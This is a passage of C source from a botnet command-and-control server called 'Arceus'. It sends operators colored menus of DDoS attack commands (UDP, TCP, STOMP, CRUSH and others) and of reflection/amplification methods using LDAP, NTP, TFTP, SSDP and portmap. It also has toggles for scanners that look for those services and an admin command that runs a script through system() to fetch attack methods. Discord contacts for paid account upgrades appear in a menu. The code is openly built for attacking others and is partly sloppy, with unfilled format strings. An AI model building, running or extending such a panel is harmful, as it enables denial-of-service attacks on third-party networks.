        sprintf(help_cmd9,  "           \e[38;5;201m║ \e[38;5;202m.tools \e[38;5;201m- \e[38;5;202mShows a list of available tools     \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd10, "           \e[38;5;201m║ \e[38;5;202m.staff \e[38;5;201m- \e[38;5;202mAdministrators only!                \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd11, "           \e[38;5;201m╚══════════════════════════════════════════════╝\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd2, strlen(help_cmd2),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd3, strlen(help_cmd3),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd4, strlen(help_cmd4),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd5, strlen(help_cmd5),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd6, strlen(help_cmd6),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd7, strlen(help_cmd7),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd8, strlen(help_cmd8),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd9, strlen(help_cmd9),   MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd10, strlen(help_cmd10),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, help_cmd11, strlen(help_cmd11),   MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
/*
                                  _____ _____  _    _ __  __   __  __                  
                                 |_   _|  __ \| |  | |  \/  | |  \/  |                 
                                   | | | |__) | |__| | \  / | | \  / | ___ _ __  _   _ 
                                   | | |  ___/|  __  | |\/| | | |\/| |/ _ \ '_ \| | | |
                                  _| |_| |    | |  | | |  | | | |  | |  __/ | | | |_| |
                                 |_____|_|    |_|  |_|_|  |_| |_|  |_|\___|_| |_|\__,_|
 */
        if(strstr(buf, ".IPHM") || strstr(buf, ".iphm"))  // Help Command - Displays Help Menu
        {
        char iphm_method1 [5000]; // Char Every Line For Output Communication
        char iphm_method2 [5000];
        char iphm_method3 [5000];
        char iphm_method4 [5000];
        char iphm_method5 [5000];
        char iphm_method6 [5000];
        char iphm_method7 [5000];
        char iphm_method8 [5000];
        char iphm_method9 [5000];
        char iphm_method10 [5000];
        char iphm_method11 [5000];
        char iphm_method12 [5000];
        char iphm_method13 [5000];
        char iphm_method14 [5000];

        sprintf(iphm_method1,  "\e[38;5;201m╔═════════════════════════╗  ╔════════════════════╗ \r\n");
        sprintf(iphm_method2,  "\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mIPHM Methods \e[38;5;201m║  ║ \e[38;5;202mDefault Port\e[38;5;201m:\e[38;5;202m 80   \e[38;5;201m║ \r\n");
        sprintf(iphm_method3,  "\e[38;5;201m╠═════════════════════════\e[38;5;201m╣  ║ \e[38;5;202mDefault time\e[38;5;201m: \e[38;5;202m300  \e[38;5;201m║ \r\n");
        sprintf(iphm_method4,  "\e[38;5;201m║ \e[38;5;202m.ldap \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              \e[38;5;201m║  ║ \e[38;5;202mDefault Threads\e[38;5;201m:\e[38;5;202m 2 \e[38;5;201m║\r\n");
        sprintf(iphm_method5,  "\e[38;5;201m║ \e[38;5;202m.ntp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]               \e[38;5;201m║  ║ \e[38;5;202mWorking On Manual  \e[38;5;201m║\r\n");
        sprintf(iphm_method6,  "\e[38;5;201m║ \e[38;5;202m.tftp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              \e[38;5;201m║  ║  \e[38;5;202mInput For Users   \e[38;5;201m║\r\n");
        sprintf(iphm_method7,  "\e[38;5;201m║ \e[38;5;202m.ssdp \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]              \e[38;5;201m║  ╚════════════════════╝\r\n");
        sprintf(iphm_method8,  "\e[38;5;201m║ \e[38;5;202m.portmap \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║  \r\n");
        sprintf(iphm_method9,  "\e[38;5;201m║ \e[38;5;202m.ZCH-WSS \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║\r\n");
        sprintf(iphm_method10, "\e[38;5;201m║ \e[38;5;202m.STL-BOO \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║\r\n");
        sprintf(iphm_method11, "\e[38;5;201m║ \e[38;5;202m.EFT-PWR \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║\r\n");
        sprintf(iphm_method12, "\e[38;5;201m║ \e[38;5;202m.PMP-PMP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║\r\n");
        sprintf(iphm_method13, "\e[38;5;201m║ \e[38;5;202m.ZCH-CRI \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m]           \e[38;5;201m║\r\n");
        sprintf(iphm_method14, "\e[38;5;201m╚═════════════════════════╝\r\n");
      
        if(send(thefd, iphm_method1, strlen(iphm_method1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method2, strlen(iphm_method2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method3, strlen(iphm_method3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method4, strlen(iphm_method4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method5, strlen(iphm_method5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method6, strlen(iphm_method6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method7, strlen(iphm_method7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method8, strlen(iphm_method8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method9, strlen(iphm_method9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method10, strlen(iphm_method10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method11, strlen(iphm_method11),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method12, strlen(iphm_method12),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method13, strlen(iphm_method13),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, iphm_method14, strlen(iphm_method14),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
/*
                                           _____                                   __  __                  
                                          / ____|                                 |  \/  |                 
                                         | (___   ___ __ _ _ __  _ __   ___ _ __  | \  / | ___ _ __  _   _ 
                                          \___ \ / __/ _` | '_ \| '_ \ / _ \ '__| | |\/| |/ _ \ '_ \| | | |
                                          ____) | (_| (_| | | | | | | |  __/ |    | |  | |  __/ | | | |_| |
                                         |_____/ \___\__,_|_| |_|_| |_|\___|_|    |_|  |_|\___|_| |_|\__,_|
 */
        if(strstr(buf, ".next") || strstr(buf, ".NEXT"))  // Help Command - Displays Help Menu
        {
        char scanner_1 [5000]; // Char Every Line For Output Communication
        char scanner_2 [5000];
        char scanner_3 [5000];
        char scanner_4 [5000];
        char scanner_5 [5000];
        char scanner_6 [5000];
        char scanner_7 [5000];
        char scanner_8 [5000];
        char scanner_9 [5000];

        sprintf(scanner_1,  "\e[38;5;201m╔═════════════════════════╗\r\n");
        sprintf(scanner_2,  "\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mIPHMScanners \e[38;5;201m║\r\n");
        sprintf(scanner_3,  "\e[38;5;201m╠═════════════════════════\e[38;5;201m╣ ╔═════════════════╗\r\n");
        sprintf(scanner_4,  "\e[38;5;201m║ \e[38;5;202m.lds on   \e[38;5;201m||  \e[38;5;202m.lds off  \e[38;5;201m║ ║ \e[38;5;202mLDAP Scanner    \e[38;5;201m║\r\n");
        sprintf(scanner_5,  "\e[38;5;201m║ \e[38;5;202m.nts on   \e[38;5;201m||  \e[38;5;202m.nts off  \e[38;5;201m║ ║ \e[38;5;202mNTP Scanner     \e[38;5;201m║\r\n");
        sprintf(scanner_6,  "\e[38;5;201m║ \e[38;5;202m.tfs on   \e[38;5;201m||  \e[38;5;202m.tfs off  \e[38;5;201m║ ║ \e[38;5;202mTFTP Scanner    \e[38;5;201m║\r\n");
        sprintf(scanner_7,  "\e[38;5;201m║ \e[38;5;202m.sds on   \e[38;5;201m||  \e[38;5;202m.sds off  \e[38;5;201m║ ║ \e[38;5;202mSSDP Scanner    \e[38;5;201m║\r\n");
        sprintf(scanner_8,  "\e[38;5;201m║ \e[38;5;202m.pos on   \e[38;5;201m||  \e[38;5;202m.pos off  \e[38;5;201m║ ║ \e[38;5;202mPortmap Scanner \e[38;5;201m║\r\n");
        sprintf(scanner_9,  "\e[38;5;201m╚═════════════════════════╝ ╚═════════════════╝\r\n");
      
        if(send(thefd, scanner_1, strlen(scanner_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_2, strlen(scanner_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_3, strlen(scanner_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_4, strlen(scanner_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_5, strlen(scanner_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_6, strlen(scanner_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_7, strlen(scanner_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_8, strlen(scanner_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, scanner_9, strlen(scanner_9),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
/*
                                         _____ _                    _____                          
                                        / ____| |                  / ____|                         
                                       | |    | | ___  __ _ _ __  | (___   ___ _ __ ___  ___ _ __  
                                       | |    | |/ _ \/ _` | '__|  \___ \ / __| '__/ _ \/ _ \ '_ \ 
                                       | |____| |  __/ (_| | |     ____) | (__| | |  __/  __/ | | |
                                        \_____|_|\___|\__,_|_|    |_____/ \___|_|  \___|\___|_| |_|
  */
         if(strstr(buf, ".clear") || strstr(buf, ".CLEAR") || strstr(buf, "CLEAR") || strstr(buf, "clear")) // Clear The Screen - We Love Cleanliness
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Arceus_1, strlen(Arceus_1), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_2, strlen(Arceus_2), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_3, strlen(Arceus_3), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_4, strlen(Arceus_4), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_5, strlen(Arceus_5), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_6, strlen(Arceus_6), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_7, strlen(Arceus_7), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_8, strlen(Arceus_8), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_9, strlen(Arceus_9), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_10, strlen(Arceus_10), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_11, strlen(Arceus_11), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_12, strlen(Arceus_12), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_13, strlen(Arceus_13), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_14, strlen(Arceus_14), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_15, strlen(Arceus_15), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_16, strlen(Arceus_16), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_17, strlen(Arceus_17), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_18, strlen(Arceus_18), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_19, strlen(Arceus_19), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input [Hostname]
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue;
        }
/*
                             _____ _____  _    _ __  __   _____           _        _ _           
                            |_   _|  __ \| |  | |  \/  | |_   _|         | |      | | |          
                              | | | |__) | |__| | \  / |   | |  _ __  ___| |_ __ _| | | ___ _ __ 
                              | | |  ___/|  __  | |\/| |   | | | '_ \/ __| __/ _` | | |/ _ \ '__|
                             _| |_| |    | |  | | |  | |  _| |_| | | \__ \ || (_| | | |  __/ |   
                            |_____|_|    |_|  |_|_|  |_| |_____|_| |_|___/\__\__,_|_|_|\___|_|   
                                                                                               
                                                                                                               */
        if (strstr(buf, ".install") || strstr(buf, ".INSTALL")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "python arc.py" );
        system(command);
        sprintf(botnet, "\e[38;5;93mAll IP-Header Modification Based methods downloaded!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
/*
                    _____        __        __  __                  
                   |_   _|      / _|      |  \/  |                 
                     | |  _ __ | |_ ___   | \  / | ___ _ __  _   _ 
                     | | | '_ \|  _/ _ \  | |\/| |/ _ \ '_ \| | | |
                    _| |_| | | | || (_) | | |  | |  __/ | | | |_| |
                   |_____|_| |_|_| \___/  |_|  |_|\___|_| |_|\__,_|
                                                                                            
                                                                      */
         if(strstr(buf, ".info") || strstr(buf, ".INFO")) // User Information - Display Menu
        {
        char user_info1 [5000];  // Char Every Line For Output Communication
        char user_info2 [5000];  // Char Every Line For Output Communication
        char user_info3 [5000];  // Char Every Line For Output Communication
        char user_info4 [5000];  // Char Every Line For Output Communication
        char user_info5 [5000];  // Char Every Line For Output Communication
        char user_info6 [5000];  // Char Every Line For Output Communication
        char user_info7 [5000];  // Char Every Line For Output Communication
        char user_info8 [5000];  // Char Every Line For Output Communication
        char user_info9 [5000];  // Char Every Line For Output Communication
        char user_info10 [5000]; // Char Every Line For Output Communication
        char user_info11 [5000]; // Char Every Line For Output Communication
        char user_info12 [5000]; // Char Every Line For Output Communication
        char user_info13 [5000]; // Char Every Line For Output Communication
        char user_info14 [5000]; // Char Every Line For Output Communication
        char user_info15 [5000]; // Char Every Line For Output Communication

        sprintf(user_info1,  "   \e[38;5;201m╔═════════════════════════════╗\r\n"); // Display Menu - User Information - This Will Be Edited Soon !
        sprintf(user_info2,  "   \e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mUser Information \e[38;5;201m║     ╔═══════════════════╗\r\n");
        sprintf(user_info3,  "   \e[38;5;201m╠═════════════════════════════╣═══╗ ║\e[38;5;202m More Coming soon! \e[38;5;201m║\r\n");
        sprintf(user_info4,  "   \e[38;5;201m║ \e[38;5;202mUsername: \e[38;5;201m                \e[38;5;201m║   ║ ║      \e[38;5;202mSuch As      \e[38;5;201m║\r\n", accounts[find_line].user, buf);
        sprintf(user_info5,  "   \e[38;5;201m║ \e[38;5;202mPassword: \e[38;5;201m                \e[38;5;201m║   ╚═╬═══════════════════╣\r\n", accounts[find_line].password, buf);
        sprintf(user_info6,  "   \e[38;5;201m║ \e[38;5;202mUser Level: \e[38;5;201m              \e[38;5;201m║     ║ \e[38;5;202mUser IP:          \e[38;5;201m║\r\n", accounts[find_line].id, buf);
        sprintf(user_info8,  "   \e[38;5;201m╚═══════════╦═════════════════╝     ╚══════════════╦════╝\r\n");
        sprintf(user_info9,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info10,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info11,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info12,  "   \e[38;5;201m   ╔════════╩══════════════════════════════════════╩═════════╗\r\n");
        sprintf(user_info13,  "   \e[38;5;201m   ║   \e[38;5;202m Want an account upgrade? dm me or zach on discord    \e[38;5;201m║\r\n");
        sprintf(user_info14,  "   \e[38;5;201m   ║     \e[38;5;93mGeorgia Cri#4337 \e[38;5;201m-  \e[38;5;202mOwO  \e[38;5;201m- \e[38;5;93mTransmissional#9845      \e[38;5;201m║  \r\n");
        sprintf(user_info15,  "   \e[38;5;201m   ╚═════════════════════════════════════════════════════════╝\r\n");

        if(send(thefd, user_info1, strlen(user_info1), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info2, strlen(user_info2), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info3, strlen(user_info3), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info4, strlen(user_info4), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info5, strlen(user_info5), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info6, strlen(user_info6), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info7, strlen(user_info7), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info8, strlen(user_info8), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info9, strlen(user_info9), MSG_NOSIGNAL) == -1) goto end;  // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info10, strlen(user_info10), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info11, strlen(user_info11), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info12, strlen(user_info12), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info13, strlen(user_info13), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info14, strlen(user_info14), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, user_info15, strlen(user_info15), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        pthread_create(&title, NULL, &titleWriter, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break; // World Break!
        }
        continue; // Let's Keep Going, Getting Tired Of Reading? Yeah.. Same..
        }
  /*
                __  __      _   _               _       __  __                  
               |  \/  |    | | | |             | |     |  \/  |                 
               | \  / | ___| |_| |__   ___   __| |___  | \  / | ___ _ __  _   _ 
               | |\/| |/ _ \ __| '_ \ / _ \ / _` / __| | |\/| |/ _ \ '_ \| | | |
               | |  | |  __/ |_| | | | (_) | (_| \__ \ | |  | |  __/ | | | |_| |
               |_|  |_|\___|\__|_| |_|\___/ \__,_|___/ |_|  |_|\___|_| |_|\__,_|
                                                                                              */
        if(strstr(buf, ".STRESS") || strstr(buf, ".stress")) // Display Menu - Stress Menu
        {
        char method_1 [5000]; // Char Every Line For Output Communication
        char method_2 [5000]; // Char Every Line For Output Communication
        char method_3 [5000]; // Char Every Line For Output Communication
        char method_4 [5000]; // Char Every Line For Output Communication
        char method_5 [5000]; // Char Every Line For Output Communication
        char method_6 [5000]; // Char Every Line For Output Communication
        char method_7 [5000]; // Char Every Line For Output Communication
        char method_8 [5000]; // Char Every Line For Output Communication
        char method_9 [5000]; // Char Every Line For Output Communication
        char method_10 [5000]; // Char Every Line For Output Communication
        char method_11 [5000]; // Char Every Line For Output Communication
        char method_12 [5000]; // Char Every Line For Output Communication | Display Menu - Stress Menu |
        sprintf(method_1,  "\e[38;5;201m╔═════════════════════════════════════════════════════╗ \r\n");
        sprintf(method_2,  "\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mDDoS Method Listing \e[38;5;201m- \e[38;5;202mAttack Method CmDs \e[38;5;201m║ \r\n");
        sprintf(method_3,  "\e[38;5;201m╠═════════════════════════════════════════════════════╣ \r\n");
        sprintf(method_4,  "\e[38;5;201m║ \e[38;5;202m.STD \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                             \e[38;5;201m║ ╔══════════════════════╗\r\n");
        sprintf(method_5,  "\e[38;5;201m║ \e[38;5;202m.UDP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 1460 10                  \e[38;5;201m║ ║ \e[38;5;202mSuggested Port\e[38;5;201m:\e[38;5;202m62627 \e[38;5;201m║\r\n");
        sprintf(method_6,  "\e[38;5;201m║ \e[38;5;202m.JUNK \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                            \e[38;5;201m║ ║ \e[38;5;202mSuggested PSize\e[38;5;201m:\e[38;5;202m1460 \e[38;5;201m║\r\n");
        sprintf(method_7,  "\e[38;5;201m║ \e[38;5;202m.STOMP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 ALL 1460 10            \e[38;5;201m║ ║ \e[38;5;202mSuggested Method\e[38;5;201m:\e[38;5;202mSTD \e[38;5;201m║\r\n");
        sprintf(method_8,  "\e[38;5;201m║ \e[38;5;202m.TCP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 \e[38;5;93m(\e[38;5;202mFlags\e[38;5;93m/\e[38;5;202mALL\e[38;5;93m)\e[38;5;202m 0 10         \e[38;5;201m║ ║ \e[38;5;202mSuggested Method\e[38;5;201m:\e[38;5;202mUDP \e[38;5;201m║\r\n");
        sprintf(method_9,  "\e[38;5;201m║ \e[38;5;202m.COMBO \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m]                           \e[38;5;201m║ ║ \e[38;5;202mMax Time\e[38;5;201m: \e[38;5;202m300        \e[38;5;201m║\r\n");
        sprintf(method_10, "\e[38;5;201m║ \e[38;5;202m.CRUSH \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] [\e[38;5;202mPORT\e[38;5;201m] [\e[38;5;202mTIME\e[38;5;201m] \e[38;5;202m32 ALL 1460 10            \e[38;5;201m║ ╚══════════════════════╝\r\n");
        sprintf(method_11, "\e[38;5;201m║ \e[38;5;202m.STOP \e[38;5;201m[\e[38;5;202mThis will stop your attack!\e[38;5;201m]                 \e[38;5;201m║ \r\n");
        sprintf(method_12, "\e[38;5;201m╚═════════════════════════════════════════════════════╝\r\n");

        // Crush, Junk, Stomp > Taken Out Lynx -- Unstable And Causes Some Define Allocation Errors - [Will Be Fixed In ALpha]
        if(send(thefd, method_1, strlen(method_1),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_2, strlen(method_2),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_3, strlen(method_3),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_4, strlen(method_4),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_5, strlen(method_5),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_6, strlen(method_6),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_7, strlen(method_7),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_8, strlen(method_8),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_9, strlen(method_9),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_10, strlen(method_10),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, method_11, strlen(method_11),    MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
